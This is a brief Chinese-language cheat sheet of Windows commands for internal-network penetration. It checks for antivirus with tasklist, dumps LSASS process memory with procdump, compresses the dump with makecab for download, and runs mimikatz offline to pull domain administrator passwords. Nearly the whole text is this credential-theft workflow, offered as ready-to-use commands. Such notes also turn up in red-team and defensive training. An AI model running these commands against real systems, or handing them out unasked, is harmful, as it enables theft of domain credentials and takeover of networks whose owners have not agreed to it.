# Intranet Cmd

---

内网渗透常用cmd命令

```
tasklist /svc  # 查看杀软情况

```

远程内存dump，本地使用mimikatz读取dump文件中域管密码

- procdump下载：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

```
procdump64.exe -accepteula -ma lsass.exe 1.dmp   # dump内存
makecab .\1.dmp  1.zip                           # windows自带压缩
下载1.zip，本地解压使用：
mimikatz.exe "log" "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
```

